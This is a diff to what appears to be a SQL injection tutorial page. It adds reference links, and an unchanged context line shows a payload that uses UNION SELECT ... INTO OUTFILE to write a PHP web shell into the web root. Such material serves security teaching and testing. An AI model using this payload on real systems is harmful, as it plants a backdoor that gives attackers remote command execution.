@@ -66,3 +66,9 @@ Let says you've found 5 columns in the query. Now, it's time to check which colu
 ' UNION ALL SELECT '<?php system($_REQUEST["cmd"]);?>' INTO OUTFILE '/var/www/html/cmd.php'-- -
 ```
 {% endcode %}
+
+## References
+
+* [https://portswigger.net/web-security/sql-injection](https://portswigger.net/web-security/sql-injection)
+* [https://github.com/payloadbox/sql-injection-payload-list](https://github.com/payloadbox/sql-injection-payload-list)
+* [https://kayran.io/blog/web-vulnerabilities/sqli-to-rce/](https://kayran.io/blog/web-vulnerabilities/sqli-to-rce/)
